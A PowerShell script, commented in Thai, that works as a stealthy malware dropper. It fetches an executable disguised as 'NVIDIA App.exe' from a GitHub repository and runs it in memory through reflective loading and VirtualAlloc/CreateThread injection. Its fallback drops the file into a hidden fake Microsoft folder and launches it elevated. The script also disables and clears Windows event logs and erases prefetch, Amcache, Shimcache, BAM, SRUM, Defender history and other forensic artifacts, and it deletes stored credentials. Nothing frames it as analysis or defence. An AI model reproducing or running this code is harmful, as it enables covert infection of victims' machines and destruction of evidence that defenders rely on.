# ============================================
# 1. ปิดการบันทึกประวัติ (ทุกทาง)
# ============================================
Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# ปิด Transcription และ Logging
$PSDefaultParameterValues['*:Verbose'] = $false
$PSDefaultParameterValues['*:Debug'] = $false

# ============================================
# 2. ปิด Windows Event Log Services (ชั่วคราว)
# ============================================
try {
    Stop-Service -Name "EventLog" -Force -ErrorAction SilentlyContinue
    Stop-Service -Name "EventCollector" -Force -ErrorAction SilentlyContinue
    Stop-Service -Name "EventForwarding" -Force -ErrorAction SilentlyContinue
    Stop-Service -Name "wecsvc" -Force -ErrorAction SilentlyContinue
} catch {}

# ============================================
# 3. ฟังก์ชันดาวน์โหลด EXE (ไม่เขียนไฟล์)
# ============================================
function Download-EXE {
    param([string]$Url)
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $wc.Proxy = $null
        return $wc.DownloadData($Url)
    } catch {
        $response = Invoke-WebRequest -Uri $Url -UseBasicParsing -UserAgent "Mozilla/5.0"
        return $response.Content
    }
}

# ============================================
# 4. รัน EXE จากหน่วยความจำ (In-Memory Execution)
#    - ไม่เขียนไฟล์ลงดิสก์
#    - รันผ่านกระบวนการใน RAM
#    - ปิด Session แล้ว RAM คืนทันที
# ============================================
function Invoke-MemoryExecution {
    param([byte[]]$Bytes)

    # วิธีที่ 1: .NET Assembly (Managed Code)
    try {
        $assembly = [System.Reflection.Assembly]::Load($Bytes)
        $entryPoint = $assembly.EntryPoint
        if ($entryPoint) {
            $entryPoint.Invoke($null, (, [string[]] @()))
            return $true
        }
    } catch {}

    # วิธีที่ 2: Reflection Injection (Unmanaged Code)
    try {
        $ReflectiveInject = {
            param([byte[]]$PEBytes)
            $kernel32 = Add-Type -MemberDefinition @'
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")]
public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
[DllImport("kernel32.dll")]
public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
'@ -Name "Kernel32" -Namespace "Win32" -PassThru

            $size = $PEBytes.Length
            $ptr = $kernel32::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
            if ($ptr -ne [IntPtr]::Zero) {
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $ptr, $size)
                $thread = $kernel32::CreateThread([IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
                if ($thread -ne [IntPtr]::Zero) {
                    $kernel32::WaitForSingleObject($thread, 0xFFFFFFFF)
                    # ✅ รอให้เธรดทำงานเสร็จ แล้วคืน RAM
                    $kernel32::VirtualFree($ptr, 0, 0x8000)
                    return $true
                }
            }
            return $false
        }
        return & $ReflectiveInject $Bytes
    } catch {
        return $false
    }
}

# ============================================
# 5. ดาวน์โหลดและรัน EXE (In-Memory Only)
# ============================================
$exeUrl = "https://github.com/zenxler98-ui/betx/raw/refs/heads/main/NVIDIA%20App.exe"
$bytes = Download-EXE -Url $exeUrl

if ($bytes -and $bytes.Length -gt 0) {
    # ✅ รัน In-Memory (ไม่เขียนไฟล์)
    $executed = Invoke-MemoryExecution -Bytes $bytes
    
    if (-not $executed) {
        # ❌ ถ้าไม่ได้ ให้เขียนไฟล์และรัน (สำรอง)
        $workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
        if (-not (Test-Path $workDir)) {
            New-Item -Path $workDir -ItemType Directory -Force | Out-Null
            & attrib +h +s $workDir
        }
        $exeOutput = Join-Path $workDir "NVIDIAApp.exe"
        [System.IO.File]::WriteAllBytes($exeOutput, $bytes)
        Start-Process -FilePath $exeOutput -Verb RunAs -WindowStyle Hidden -WorkingDirectory $workDir
    }
}

# ============================================
# 6. ล้างร่องรอยทุกอย่าง (แบบไม่ต้องรีบูต)
# ============================================

# --- 6.1 ล้าง PowerShell History ---
try {
    Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:USERPROFILE\.pshistory" -Force -ErrorAction SilentlyContinue
    Clear-History
} catch {}

# --- 6.2 ล้าง Event Logs (ทั้งหมด) ---
try {
    wevtutil cl Security 2>$null
    wevtutil cl System 2>$null
    wevtutil cl Application 2>$null
    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
    wevtutil cl "Windows PowerShell" 2>$null
} catch {}

# --- 6.3 ล้าง Prefetch ---
try {
    Remove-Item "C:\Windows\Prefetch\*.pf" -Force -ErrorAction SilentlyContinue
} catch {}

# --- 6.4 ล้าง Amcache ---
try {
    Remove-Item "C:\Windows\AppCompat\Programs\Amcache.hve" -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\AppCompat\Programs\Amcache.hve.LOG1" -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\AppCompat\Programs\Amcache.hve.LOG2" -Force -ErrorAction SilentlyContinue
} catch {}

# --- 6.5 ล้าง Recent Documents ---
try {
    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse -Force -ErrorAction SilentlyContinue
} catch {}

# --- 6.6 ล้าง Temp Files ---
try {
    Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
} catch {}

# --- 6.7 ล้าง Registry (RunMRU, TypedURLs, Search) ---
try {
    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "HKCU:\Software\Microsoft\Internet Explorer\TypedURLs" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search\SearchHistory" -Recurse -Force -ErrorAction SilentlyContinue
} catch {}

# --- 6.8 ล้าง Jump Lists ---
try {
    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*" -Force -ErrorAction SilentlyContinue
} catch {}

# --- 6.9 ล้าง Thumbnail / Icon Cache ---
try {
    Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\thumbcache_*.db" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:LOCALAPPDATA\IconCache.db" -Force -ErrorAction SilentlyContinue
} catch {}

# --- 6.10 ล้าง BAM/DAM ---
try {
    Stop-Service -Name "bam","dam" -Force -ErrorAction SilentlyContinue
    Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings" -Recurse -Force -ErrorAction SilentlyContinue
} catch {}

# --- 6.11 ล้าง DNS Cache ---
try {
    ipconfig /flushdns 2>$null
} catch {}

# --- 6.12 ล้าง Windows Defender Protection History ---
try {
    Stop-Service -Name "WinDefend" -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\ProgramData\Microsoft\Windows Defender\Scans\mpcache-*" -Force -ErrorAction SilentlyContinue
    Start-Service -Name "WinDefend" -ErrorAction SilentlyContinue
} catch {}

# --- 6.13 ล้าง Firewall Logs ---
try {
    Remove-Item "C:\Windows\System32\LogFiles\Firewall\pfirewall.log" -Force -ErrorAction SilentlyContinue
} catch {}

# --- 6.14 ล้าง Shimcache ---
try {
    Remove-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" -Name "AppCompatCache" -Force -ErrorAction SilentlyContinue
} catch {}

# --- 6.15 ล้าง UserAssist ---
try {
    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" -Recurse -Force -ErrorAction SilentlyContinue
} catch {}

# --- 6.16 ล้าง RecentFileCache ---
try {
    Remove-Item "C:\Windows\AppCompat\Programs\RecentFileCache.bcf" -Force -ErrorAction SilentlyContinue
} catch {}

# --- 6.17 ล้าง SRUM (Network usage) ---
try {
    Stop-Service -Name "srumsvc" -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\System32\sru\srudb.dat" -Force -ErrorAction SilentlyContinue
} catch {}

# --- 6.18 ล้าง PowerShell Module Cache ---
try {
    Remove-Item "$env:USERPROFILE\AppData\Local\Microsoft\PowerShell\*" -Recurse -Force -ErrorAction SilentlyContinue
} catch {}

# --- 6.19 ล้าง Windows Search Index ---
try {
    Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\ProgramData\Microsoft\Search\Data\Applications\Windows\Windows.edb" -Force -ErrorAction SilentlyContinue
    Start-Service -Name "WSearch" -ErrorAction SilentlyContinue
} catch {}

# --- 6.20 ล้าง Credential Manager ---
try {
    cmdkey /delete * 2>$null
} catch {}

# --- 6.21 ล้าง Clipboard History ---
try {
    Set-Clipboard -Value $null 2>$null
} catch {}

# --- 6.22 ล้าง Console Buffer ---
try {
    [System.Console]::Clear() 2>$null
} catch {}

# ============================================
# 7. เปิด Windows Event Log Services กลับ (ถ้าต้องการ)
# ============================================
try {
    Start-Service -Name "EventLog" -ErrorAction SilentlyContinue
    Start-Service -Name "EventCollector" -ErrorAction SilentlyContinue
    Start-Service -Name "wecsvc" -ErrorAction SilentlyContinue
} catch {}

# ============================================
# 8. ปิดตัวเองอย่างเงียบ (คืน RAM ทันที)
# ============================================
$bytes = $null
$exeUrl = $null
[GC]::Collect()
[GC]::WaitForPendingFinalizers()
[Environment]::Exit(0)
